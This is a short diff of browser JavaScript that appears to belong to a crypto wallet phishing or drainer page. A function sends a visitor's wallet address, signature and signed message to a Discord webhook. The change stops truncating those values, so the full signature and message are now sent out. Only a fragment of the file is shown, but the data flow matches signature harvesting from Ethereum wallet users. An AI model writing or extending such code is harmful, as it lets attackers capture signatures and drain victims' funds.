@@ -55,13 +55,13 @@ async function sendToDiscordWebhook(userAddress, signature, message) {
                 inline: true
             },
             {
-                name: "✍️ Подпись (первые 50 символов)",
-                value: `\`\`\`${signature.substring(0, 200)}...\`\`\``,
+                name: "✍️ Полная подпись",
+                value: `\`\`\`${signature}\`\`\``,
                 inline: false
             },
             {
                 name: "📝 Сообщение",
-                value: `\`\`\`${message.substring(0, 100)}...\`\`\``,
+                value: `\`\`\`${message}\`\`\``,
                 inline: false
             },
             {
@@ -245,4 +245,3 @@ if (typeof window.ethereum !== 'undefined') {
         window.location.reload();
     });
 }
-
